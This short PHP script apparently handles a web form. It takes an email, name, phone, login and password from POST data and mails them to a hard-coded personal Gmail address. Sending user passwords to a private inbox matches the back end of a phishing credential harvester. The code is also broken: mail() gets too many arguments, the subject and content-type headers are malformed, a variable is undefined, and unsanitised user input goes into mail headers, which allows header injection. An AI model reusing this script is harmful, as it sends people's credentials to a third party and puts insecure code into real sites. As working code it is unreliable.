<?php
$email = $_POST['Email'];
$name = $_POST['name'];
$phone = $_POST['phone'];
$login = $_POST['login'];
$password = $_POST['password'];

$subject = "?utf-8?8?".base64_encode("Sayt xabari")."?=";
$headers = "From: $email\r\nReply-to: $email\r\nContent=type: text/html; charset=utf-8\r\n";
$success = mail("yuldashevyorqin77@gmail.com", $subject, $email, $phone, $login, $password, $message, $headers);
echo $success;
?>